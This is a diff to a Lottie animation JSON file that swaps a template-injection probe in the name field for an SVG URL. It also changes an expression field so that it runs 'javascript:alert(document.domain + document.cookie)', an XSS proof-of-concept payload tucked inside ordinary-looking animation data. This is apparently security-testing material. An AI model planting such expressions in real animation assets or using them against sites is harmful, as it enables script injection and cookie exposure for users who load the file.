@@ -5,7 +5,7 @@
   "op": 180,
   "w": 300,
   "h": 300,
-  "nm": "{{7*7}}",
+  "nm": "https://www.svgrepo.com/show/80271/evil-emoticon.svg",
   "ddd": 0,
   "assets": [
     {
@@ -32,7 +32,7 @@
         "s": {
           "a": 0,
           "k": [100, 100, 100],
-          "x": "var $bm_rt = [256, 256]\nvar rotation = location='javascript:alert(document.domain)'"
+          "x": "var $bm_rt = [256, 256]\nvar rotation = location='javascript:alert(document.domain + document.cookie)'"
         }
       },
       "ip": 0,
